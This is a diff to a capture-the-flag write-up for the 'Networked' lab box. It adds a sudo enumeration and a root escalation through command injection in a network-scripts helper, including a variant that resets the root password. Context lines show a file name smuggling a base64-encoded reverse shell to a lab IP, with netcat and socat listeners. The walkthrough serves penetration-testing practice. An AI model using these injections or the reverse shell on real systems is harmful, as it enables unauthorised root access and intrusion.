@@ -15,6 +15,7 @@ Tags
 Required tools
 * nmap
 * gobuster
+* linpeas
 
 Other commands/tools
 ```
@@ -333,6 +334,65 @@ touch ';echo YmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMTQ6NDI0MiAwPiYx | base64 -d | 
 date
 nc -lvnp 4242
 socat file:`tty`,raw,echo=0 tcp-listen:4242
+
+# flag
+cat /home/guly/user.txt
 ```
 
 ### Privilege Escalation
+
+Equivalent to linPEAS
+```bash
+# list executable commands with sudo privilege
+sudo -l
+Matching Defaults entries for guly on networked:
+  !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+  env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+  env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+  env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+  env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+  env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+  secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User guly may run the following commands on networked:
+  (root) NOPASSWD: /usr/local/sbin/changename.sh
+```
+
+Exploit known RCE vulnerability via command injection
+
+* [Redhat/CentOS root through network-scripts](https://seclists.org/fulldisclosure/2019/Apr/24)
+
+```bash
+# leverage code execution with spaces
+TEST=x whoami
+
+# see
+/usr/local/sbin/changename.sh
+/etc/sysconfig/network-scripts/ifcfg-guly
+
+# add SPACE + COMMAND as input to any variable
+NAME=hello sh
+
+# get root access
+[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
+interface NAME:
+hello bash
+interface PROXY_METHOD:
+aaa
+interface BROWSER_ONLY:
+bbb
+interface BOOTPROTO:
+ccc
+[root@networked network-scripts]#
+
+# alternative, change password
+[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
+interface NAME:
+aaa passwd
+
+# login with new password
+su
+
+# flag
+cat /root/root.txt
+```
